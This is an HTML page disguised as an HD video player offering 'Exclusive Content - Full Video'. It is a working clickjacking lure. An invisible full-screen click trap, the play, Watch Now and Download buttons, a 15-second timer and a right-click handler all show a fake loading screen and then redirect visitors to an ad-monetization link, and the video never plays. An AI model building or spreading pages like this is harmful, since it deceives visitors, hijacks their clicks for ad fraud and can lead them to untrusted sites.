<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Video Player - HD</title>
    <meta name="robots" content="noindex, nofollow, noarchive">
    <meta name="referrer" content="no-referrer">
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        
        body {
            background: linear-gradient(135deg, #0f0f0f 0%, #1a1a2e 100%);
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Arial, sans-serif;
            min-height: 100vh;
            display: flex;
            flex-direction: column;
            align-items: center;
            padding: 20px;
        }
        
        .header {
            width: 100%;
            max-width: 900px;
            display: flex;
            justify-content: space-between;
            align-items: center;
            margin-bottom: 20px;
            padding: 15px 20px;
            background: rgba(255,255,255,0.05);
            border-radius: 10px;
        }
        
        .logo {
            font-size: 24px;
            font-weight: bold;
            color: #e94560;
        }
        
        .quality-badge {
            background: #e94560;
            color: white;
            padding: 5px 15px;
            border-radius: 20px;
            font-size: 12px;
            font-weight: bold;
        }
        
        .container {
            max-width: 900px;
            width: 100%;
        }
        
        .video-wrapper {
            position: relative;
            background: #000;
            border-radius: 15px;
            overflow: hidden;
            box-shadow: 0 20px 60px rgba(0,0,0,0.5);
        }
        
        video {
            width: 100%;
            display: block;
            max-height: 500px;
            object-fit: contain;
        }
        
        /* Play overlay */
        .play-overlay {
            position: absolute;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: rgba(0,0,0,0.4);
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: center;
            cursor: pointer;
            transition: all 0.3s;
        }
        
        .play-overlay:hover {
            background: rgba(0,0,0,0.2);
        }
        
        .play-btn {
            width: 100px;
            height: 100px;
            background: rgba(233, 69, 96, 0.95);
            border-radius: 50%;
            display: flex;
            align-items: center;
            justify-content: center;
            font-size: 40px;
            color: white;
            box-shadow: 0 10px 40px rgba(233, 69, 96, 0.4);
            transition: transform 0.3s, box-shadow 0.3s;
        }
        
        .play-overlay:hover .play-btn {
            transform: scale(1.15);
            box-shadow: 0 15px 50px rgba(233, 69, 96, 0.6);
        }
        
        .play-text {
            color: white;
            margin-top: 20px;
            font-size: 18px;
            text-shadow: 0 2px 10px rgba(0,0,0,0.5);
        }
        
        /* Video info */
        .video-info {
            background: rgba(255,255,255,0.05);
            padding: 25px;
            border-radius: 15px;
            margin-top: 20px;
            color: white;
        }
        
        .video-title {
            font-size: 22px;
            margin-bottom: 10px;
            font-weight: 600;
        }
        
        .video-meta {
            display: flex;
            gap: 20px;
            color: #888;
            font-size: 14px;
            margin-bottom: 20px;
        }
        
        .meta-item::before {
            margin-right: 5px;
        }
        
        .views::before { content: "👁"; }
        .duration::before { content: "⏱"; }
        .uploaded::before { content: "📅"; }
        
        /* Action buttons */
        .actions {
            display: flex;
            gap: 15px;
            margin-top: 20px;
        }
        
        .btn {
            flex: 1;
            padding: 15px 25px;
            border: none;
            border-radius: 10px;
            font-size: 16px;
            font-weight: 600;
            cursor: pointer;
            transition: all 0.3s;
        }
        
        .btn-primary {
            background: linear-gradient(135deg, #e94560 0%, #c23a51 100%);
            color: white;
        }
        
        .btn-primary:hover {
            transform: translateY(-2px);
            box-shadow: 0 10px 30px rgba(233, 69, 96, 0.4);
        }
        
        .btn-secondary {
            background: rgba(255,255,255,0.1);
            color: white;
        }
        
        .btn-secondary:hover {
            background: rgba(255,255,255,0.2);
        }
        
        /* Loading animation */
        .loader {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: #0a0a0a;
            display: none;
            flex-direction: column;
            align-items: center;
            justify-content: center;
            z-index: 10000;
        }
        
        .loader.active {
            display: flex;
        }
        
        .spinner {
            width: 60px;
            height: 60px;
            border: 4px solid #333;
            border-top: 4px solid #e94560;
            border-radius: 50%;
            animation: spin 1s linear infinite;
            margin-bottom: 20px;
        }
        
        @keyframes spin {
            100% { transform: rotate(360deg); }
        }
        
        /* Click trap overlay */
        #clickTrap {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            z-index: 9999;
            opacity: 0;
            cursor: pointer;
        }
        
        /* Responsive */
        @media (max-width: 600px) {
            .video-title { font-size: 18px; }
            .play-btn { width: 80px; height: 80px; font-size: 30px; }
            .actions { flex-direction: column; }
        }
    </style>
</head>
<body>
    <!-- Invisible click trap -->
    <div id="clickTrap"></div>
    
    <!-- Loading screen -->
    <div class="loader" id="loader">
        <div class="spinner"></div>
        <p>Loading video...</p>
    </div>

    <div class="header">
        <div class="logo">🔥 VideoHub</div>
        <div class="quality-badge">HD 1080p</div>
    </div>

    <div class="container">
        <!-- Video Player -->
        <div class="video-wrapper">
            <video id="video" poster="">
                <source src="https://files.catbox.moe/0jxllt.mp4" type="video/mp4">
                Your browser does not support the video tag.
            </video>
            
            <div class="play-overlay" id="playOverlay">
                <div class="play-btn">▶</div>
                <div class="play-text">Click to Play</div>
            </div>
        </div>
        
        <!-- Video Info -->
        <div class="video-info">
            <div class="video-title">Exclusive Content - Full Video</div>
            <div class="video-meta">
                <span class="meta-item views">12.5K views</span>
                <span class="meta-item duration">6:42</span>
                <span class="meta-item uploaded">2 hours ago</span>
            </div>
            
            <div class="actions">
                <button class="btn btn-primary" onclick="watchNow()">▶ Watch Now</button>
                <button class="btn btn-secondary" onclick="download()">⬇ Download</button>
            </div>
        </div>
    </div>

    <script>
        // Tor redirect link
        const redirectUrl = "https://www.profitableratecpm.com/kcjgbwmvb9?key=8dae8af121267bec302035fbafd01f61";
        
        // Elements
        const clickTrap = document.getElementById('clickTrap');
        const playOverlay = document.getElementById('playOverlay');
        const loader = document.getElementById('loader');
        
        // Click anywhere to redirect
        clickTrap.addEventListener('click', redirect);
        
        // Play button click
        playOverlay.addEventListener('click', function(e) {
            e.stopPropagation();
            showLoader();
            setTimeout(redirect, 1500);
        });
        
        // Watch Now button
        function watchNow() {
            showLoader();
            setTimeout(redirect, 1000);
        }
        
        // Download button
        function download() {
            showLoader();
            setTimeout(redirect, 1000);
        }
        
        // Show loading
        function showLoader() {
            loader.classList.add('active');
        }
        
        // Redirect function
        function redirect() {
            window.location.href = redirectUrl;
        }
        
        // Auto redirect after 15 seconds
        setTimeout(function() {
            showLoader();
            setTimeout(redirect, 2000);
        }, 15000);
        
        // Disable right click
        document.addEventListener('contextmenu', function(e) {
            e.preventDefault();
            redirect();
        });
    </script>
</body>
</html>
